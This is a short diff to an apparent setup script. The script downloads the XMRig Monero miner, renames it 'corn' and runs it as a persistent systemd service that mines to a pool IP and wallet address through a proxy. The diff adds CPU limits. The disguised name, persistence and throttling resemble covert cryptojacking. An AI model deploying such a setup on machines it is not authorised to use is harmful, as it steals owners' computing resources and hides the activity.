@@ -16,7 +16,7 @@ cd /home/corn
 
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 
-cp xmrig-6.22.2-linux-static-x64.tar.gz corn.tar.gz
+mv xmrig-6.22.2-linux-static-x64.tar.gz corn.tar.gz
 
 tar xzfv corn.tar.gz
 
@@ -38,7 +38,7 @@ After=network.target
 
 WorkingDirectory=/home/corn/corn
 
-ExecStart=/home/corn/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x  -k --proxy 127.0.0.1:1080 
+ExecStart=/home/corn/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x  --cpu-priority=2 --cpu-max-threads-hint=50 -k --proxy 127.0.0.1:1080 
 
 Restart=always
 
